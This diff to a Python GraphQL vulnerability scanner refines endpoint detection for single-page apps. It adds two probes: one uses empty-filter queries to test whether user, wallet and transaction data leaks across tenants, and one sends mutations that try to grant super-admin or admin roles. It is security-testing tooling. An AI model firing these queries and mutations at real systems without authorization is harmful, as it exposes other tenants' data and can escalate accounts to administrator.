@@ -118,9 +118,13 @@ class GraphQLScanEngine:
         Directory where findings JSON will be written.
     """
 
-    def __init__(self, target: str, output_dir: str = ".") -> None:
+    def __init__(self, target: str, output_dir: str = ".", is_spa: bool = False) -> None:
         self.target = target.rstrip("/")
         self.output_dir = output_dir
+        # When the target is a React/Vue/Angular SPA, all path-guessing returns HTTP 200.
+        # Set is_spa=True to skip detect_endpoints() path enumeration and only test
+        # URLs explicitly provided (e.g. discovered via JS bundle parsing).
+        self.is_spa = is_spa
         self._session = requests.Session()
         self._session.verify = False
         self._session.headers.update({
@@ -152,9 +156,16 @@ class GraphQLScanEngine:
         """
         Probe common GraphQL path suffixes against the target.
 
-        Returns a list of URLs that responded with HTTP 200 and a body
-        that looks like GraphQL (contains 'data' or 'errors' or '__schema').
+        Returns a list of URLs that responded to a GraphQL ping with a valid
+        JSON response containing 'data' or 'errors' keys.
+
+        When is_spa=True, path-guessing is skipped entirely — a React/Vue/Angular
+        SPA returns HTTP 200 for every path, making all guessed paths false positives.
+        The caller should provide the real GraphQL URL via additional_targets instead.
         """
+        if self.is_spa:
+            log.info("detect_endpoints: SPA mode — skipping path enumeration for %s", self.target)
+            return []
         found: List[str] = []
         for path in _COMMON_PATHS:
             url = urljoin(self.target + "/", path.lstrip("/"))
@@ -165,12 +176,22 @@ class GraphQLScanEngine:
                     json={"query": "{ __typename }"},
                     timeout=_DEFAULT_TIMEOUT,
                 )
-                body = resp.text.lower()
-                if resp.status_code in (200, 400) and any(
-                    kw in body for kw in ("__typename", "data", "errors", "graphql")
-                ):
-                    log.info("GraphQL endpoint found: %s (HTTP %d)", url, resp.status_code)
-                    found.append(url)
+                # Must be parseable as JSON with GraphQL-specific keys.
+                # Checking raw text for "data" produces massive false positives on
+                # React SPAs where the HTML always contains these words.
+                if resp.status_code in (200, 400):
+                    try:
+                        parsed = resp.json()
+                        # Real GraphQL response: {"data": {...}} or {"errors": [...]}
+                        if (
+                            isinstance(parsed, dict) and
+                            ("data" in parsed or "errors" in parsed or "__schema" in str(parsed))
+                        ):
+                            log.info("GraphQL endpoint found: %s (HTTP %d)", url, resp.status_code)
+                            found.append(url)
+                    except (ValueError, KeyError):
+                        # HTML response (SPA) — not a GraphQL endpoint
+                        pass
             except requests.RequestException as exc:
                 log.debug("Probe failed for %s: %s", url, exc)
         return found
@@ -850,6 +871,165 @@ class GraphQLScanEngine:
         return findings
 
     # ------------------------------------------------------------------ #
+    # BOLA / privilege-escalation checks (no introspection required)
+    # ------------------------------------------------------------------ #
+
+    def test_bola_filter_bypass(self, endpoint: str) -> List[dict]:
+        """
+        Test for BOLA (Broken Object Level Authorization) via missing org-scope enforcement.
+
+        Many GraphQL APIs accept a filter or organisation_id parameter. When the filter
+        is empty ({}) or the org param is omitted, some resolvers return data from ALL
+        tenants instead of scoping to the caller's org. This is the critical finding
+        missed in SpendAble testing: search_user(filter: {}) returned all users from
+        all orgs, not just the caller's org.
+
+        Tests known high-value query names that commonly have this pattern. Works even
+        when introspection is disabled (static list of common field names).
+        """
+        findings: List[dict] = []
+        session = next(iter(self._auth_sessions.values()), self._session)
+
+        _BOLA_QUERIES = [
+            ("search_user",
+             "query { search_user(filter: {}) { user_id email organisation_id role_name } }"),
+            ("search_wallet",
+             "query { search_wallet(filter: {}) { wallet_id balance organisation_id } }"),
+            ("list_users",
+             "query { list_users(input: {}) { user_id email organisation_id } }"),
+            ("search_recurring_transaction",
+             "query { search_recurring_transaction(filter: {}) { id amount organisation_id } }"),
+            ("get_users",
+             "query { get_users { user_id email organisation_id } }"),
+            ("users",
+             "query { users { id email organizationId } }"),
+        ]
+
+        for name, query in _BOLA_QUERIES:
+            try:
+                resp = session.post(
+                    endpoint,
+                    json={"query": query},
+                    timeout=_DEFAULT_TIMEOUT,
+                )
+                if resp.status_code != 200:
+                    continue
+                try:
+                    body = resp.json()
+                except ValueError:
+                    continue
+                data = body.get("data", {})
+                errors = body.get("errors", [])
+                if errors or not data:
+                    continue
+                results = next(iter(data.values()), None)
+                if not isinstance(results, list) or len(results) < 2:
+                    continue
+                # Check if multiple organisation_ids present (cross-tenant data)
+                org_ids = set()
+                for item in results:
+                    if isinstance(item, dict):
+                        oid = item.get("organisation_id") or item.get("organizationId") or item.get("org_id")
+                        if oid:
+                            org_ids.add(str(oid))
+                if len(org_ids) > 1:
+                    severity = "critical"
+                    evidence = (
+                        f"Query '{name}' with empty filter returned {len(results)} records "
+                        f"across {len(org_ids)} distinct organisation_ids — cross-tenant data exposure"
+                    )
+                elif len(results) >= 2:
+                    # Can't confirm multi-org, but empty filter returning many results is suspicious
+                    severity = "high"
+                    evidence = (
+                        f"Query '{name}' with empty filter returned {len(results)} records "
+                        f"with no org-scoping — potential BOLA (unverifiable without second account)"
+                    )
+                else:
+                    continue
+                findings.append(_make_finding(
+                    vuln_type="graphql_bola_missing_org_scope",
+                    severity=severity,
+                    url=endpoint,
+                    endpoint=endpoint,
+                    payload=query,
+                    evidence=evidence,
+                    confidence=0.85 if len(org_ids) > 1 else 0.65,
+                ))
+                log.info("BOLA filter bypass: %s at %s (%s org_ids)", name, endpoint, len(org_ids))
+            except Exception as exc:
+                log.debug("test_bola_filter_bypass: %s failed: %s", name, exc)
+        return findings
+
+    def test_privilege_escalation_mutations(self, endpoint: str) -> List[dict]:
+        """
+        Test GraphQL mutations for missing server-side authorization enforcement.
+
+        Critical pattern: update_user_role / assign_admin mutations that do not
+        verify the caller's role is >= the target role. An OPERATIONS_MANAGER should
+        not be able to assign ORGANISATION_SUPER_ADMIN to themselves.
+
+        Works when introspection is disabled — uses a static list of known mutation
+        patterns common in SaaS multi-tenant applications.
+        """
+        findings: List[dict] = []
+        session = next(iter(self._auth_sessions.values()), self._session)
+
+        # Use placeholder UUIDs — real IDs would be needed for full confirmation
+        # but a 200 response with data (not errors) is high-confidence evidence
+        _PRIVESC_MUTATIONS = [
+            ("update_user_role",
+             'mutation { update_user_role(input: {organisation_id: "00000000-0000-0000-0000-000000000001", '
+             'role_name: "ORGANISATION_SUPER_ADMIN", user_id: "00000000-0000-0000-0000-000000000001"}) '
+             '{ relationship_id user_id organisation_id } }'),
+            ("assign_admin",
+             'mutation { assign_admin(input: {user_id: "1", admin: true}) { success id } }'),
+            ("update_user_permission",
+             'mutation { update_user_permission(input: {user_id: "1", permission: "ADMIN"}) { id permission } }'),
+            ("promote_user",
+             'mutation { promote_user(user_id: "1", role: "admin") { id role } }'),
+            ("set_user_role",
+             'mutation { set_user_role(input: {user_id: "1", role: "superadmin"}) { id role } }'),
+        ]
+
+        for name, query in _PRIVESC_MUTATIONS:
+            try:
+                resp = session.post(
+                    endpoint,
+                    json={"query": query},
+                    timeout=_DEFAULT_TIMEOUT,
+                )
+                if resp.status_code != 200:
+                    continue
+                try:
+                    body = resp.json()
+                except ValueError:
+                    continue
+                errors = body.get("errors", [])
+                data = body.get("data", {})
+                # If data is present and non-null with no auth errors → privilege escalation
+                if not errors and data:
+                    result_val = next(iter(data.values()), None)
+                    if result_val is not None:
+                        findings.append(_make_finding(
+                            vuln_type="graphql_privilege_escalation",
+                            severity="critical",
+                            url=endpoint,
+                            endpoint=endpoint,
+                            payload=query,
+                            evidence=(
+                                f"Mutation '{name}' returned HTTP 200 with data (no auth error) — "
+                                f"server may not enforce role >= target role requirement. "
+                                f"Response: {str(result_val)[:100]}"
+                            ),
+                            confidence=0.80,
+                        ))
+                        log.info("Privilege escalation candidate: %s at %s", name, endpoint)
+            except Exception as exc:
+                log.debug("test_privilege_escalation_mutations: %s failed: %s", name, exc)
+        return findings
+
+    # ------------------------------------------------------------------ #
     # Orchestration
     # ------------------------------------------------------------------ #
 
@@ -934,6 +1114,20 @@ class GraphQLScanEngine:
                 all_findings.extend(arg_findings)
             except Exception as exc:
                 log.warning("fuzz_field_args failed on %s: %s", endpoint, exc)
+
+            # BOLA filter bypass (works with or without introspection)
+            try:
+                bola_findings = self.test_bola_filter_bypass(endpoint)
+                all_findings.extend(bola_findings)
+            except Exception as exc:
+                log.warning("test_bola_filter_bypass failed on %s: %s", endpoint, exc)
+
+            # Privilege escalation mutations (works without introspection)
+            try:
+                privesc_findings = self.test_privilege_escalation_mutations(endpoint)
+                all_findings.extend(privesc_findings)
+            except Exception as exc:
+                log.warning("test_privilege_escalation_mutations failed on %s: %s", endpoint, exc)
 
         log.info(
             "GraphQL scan complete for %s — %d finding(s)",
